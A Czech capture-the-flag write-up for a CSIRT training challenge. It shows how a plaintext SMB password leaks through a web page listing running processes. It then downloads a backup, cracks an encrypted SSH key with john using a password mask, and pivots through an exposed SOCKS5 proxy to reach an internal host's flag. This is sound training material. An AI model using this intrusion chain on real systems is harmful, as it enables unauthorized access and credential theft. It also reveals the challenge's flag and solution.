# Admin John (5)

## Zadání

Hi, TCC-CSIRT analyst,

please check if any inappropriate services are running on the workstation `john.admins.cypherfix.tcc`. We know that this workstation belongs to an administrator who likes to experiment on his own machine.

See you in the next incident!

## Nápovědy (Hints)

## Řešení

Začneme skenováním portů

`nmap john.admins.cypherfix.tcc`

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Na webové stránce <http://john.admins.cypherfix.tcc/> se vypíše jen text `Hello world in PHP.`.

Zkusíme najít další skryté PHP stránky.

`ffuf -w /usr/share/dirb/wordlists/common.txt -u http://john.admins.cypherfix.tcc/FUZZ.php`

```text
.htpasswd               [Status: 403, Size: 290, Words: 20, Lines: 10, Duration: 23ms]
                        [Status: 403, Size: 290, Words: 20, Lines: 10, Duration: 2038ms]
.htaccess               [Status: 403, Size: 290, Words: 20, Lines: 10, Duration: 2274ms]
.hta                    [Status: 403, Size: 290, Words: 20, Lines: 10, Duration: 2274ms]
environment             [Status: 200, Size: 3179, Words: 1095, Lines: 31, Duration: 19ms]
index                   [Status: 200, Size: 28, Words: 4, Lines: 1, Duration: 17ms]
```

Na stránce <http://john.admins.cypherfix.tcc/environment.php> se zobrazí spuštěné procesy a další informace.

```text
...
root 64 0.0 0.0 3976 2416 ? S Oct14 0:00 \_ cron -f
root 52576 0.0 0.0 5868 2636 ? S 07:11 0:00 | \_ CRON -f
root 52577 0.0 0.0 2576 948 ? Ss 07:11 0:00 | \_ /bin/sh -c /bin/ps faxu > /backup/ps.txt
root 52578 0.0 0.0 8100 3984 ? R 07:11 0:00 | \_ /bin/ps faxu
root 65 0.0 0.1 15432 9232 ? S Oct14 0:07 \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
john@tc+ 66 0.0 0.0 2464 884 ? S Oct14 0:00 \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
john@tc+ 67 0.1 0.1 15640 12136 pts/0 Ss+ Oct14 1:38 \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
```

Obsah stránky zřejmě obnovuje `/bin/sh -c /bin/ps faxu > /backup/ps.txt`.

Z řádky `sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100` je zřejmé, že na portu 23000 běží SOCKS5 proxy a tuneluje provoz na PC 10.99.24.100. Heslo pro uživatele backuper je ale bohužel skryté.

Po periodickém obnovování stránky se objeví další spuštěné procesy.

```text
root 64 0.0 0.0 3976 2416 ? S Oct14 0:00 \_ cron -f
root 53807 0.0 0.0 5868 2468 ? S 07:20 0:00 | \_ CRON -f
root 53809 0.0 0.0 2576 920 ? Ss 07:20 0:00 | \_ /bin/sh -c read -t 2.0; /bin/bash /opt/client/backup.sh
root 53811 0.0 0.0 3924 2876 ? S 07:20 0:00 | \_ /bin/bash /opt/client/backup.sh
root 53817 0.0 0.0 34308 4800 ? R 07:20 0:00 | \_ smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c put /backup/backup-1728976801.tgz backup-home.tgz
root 53818 0.0 0.0 8100 4068 ? R 07:20 0:00 | \_ ps faxu
root 65 0.0 0.1 15432 9232 ? S Oct14 0:07 \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
john@tc+ 66 0.0 0.0 2464 884 ? S Oct14 0:00 \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
john@tc+ 67 0.2 0.1 15640 12136 pts/0 Ss+ Oct14 1:45 \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
```

Tady už je heslo `Bprn5ibLF4KNS4GR5dt4` pro uživatele `backuper` zobrazené.

Provedeme skenování portů 10.99.24.100.

`nmap 10.99.24.100`

```text
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Porty 139 a 445 značí, že na PC běží samba sdílení.

Zobrazíme si obsah sdílené složky

`smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c dir`

```text
  .                                   D        0  Mon Oct 14 13:10:37 2024
  ..                                  D        0  Mon Oct 14 13:10:34 2024
  backup-home.tgz                     A  5830741  Tue Oct 15 03:20:01 2024
```

Stáhneme soubor se zálohou

`smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c "get backup-home.tgz"`

Zde je stažený archiv [backup-home.tgz](backup-home.tgz).

V záloze je také privátní klíč `.ssh/id_rsa`, ale je chráněný heslem

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,F777BAF040CA045AC209801D46DCA63B
```

V souboru `.bash_history` jsou zajímavé tyto řádky

```text
ssh -i ~/.ssh/id_rsa root@esx1.tcc.local
Enterprise1512
ssh-keygen -p -f ~/.ssh/id_rsa
```

Heslo `Enterprise1512` ale pro `id_rsa` nefunguje.

Vygenerujeme si hash z `id_rsa` pro program john.

`ssh2john id_rsa > id_rsa.hash`

Zkusíme použít slovník `rockyou.txt`.

`john --wordlist=rockyou.txt id_rsa.hash`

Bohužel tam heslo není.

Zkusíme vyjít z textu `Enterprise1512` a projít všechny možné kombinace čísel.

`john --mask=Enterprise?d?d?d?d id_rsa.hash`

Heslo `Enterprise2215` bylo nalezeno.

SSH připojení privátním klíčem nefunguje ani na `john.admins.cypherfix.tcc` ani `10.99.24.100`.

V souboru ze zálohy `.ssh/authorized_keys` je vidět, že spojení je povolené jen z `10.99.24.100`.

`from="10.99.24.100",command="cat /home/john@tcc.local/flag.txt" ssh-rsa AAAAB...`

Port 23000 `john.admins.cypherfix.tcc` je tunelovaný protokolem SOCKS5 do 10.99.24.100, takže použijeme připojení SSH prostřednictvím proxy.

`ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy john.admins.cypherfix.tcc:23000 %h %p' -i id_rsa -v john@tcc.local@10.99.24.101`

Navázané spojení vypíše hledaný FLAG a ukončí spojení.

## Flag

`FLAG{sIej-5d9a-aIbh-v4qH}`
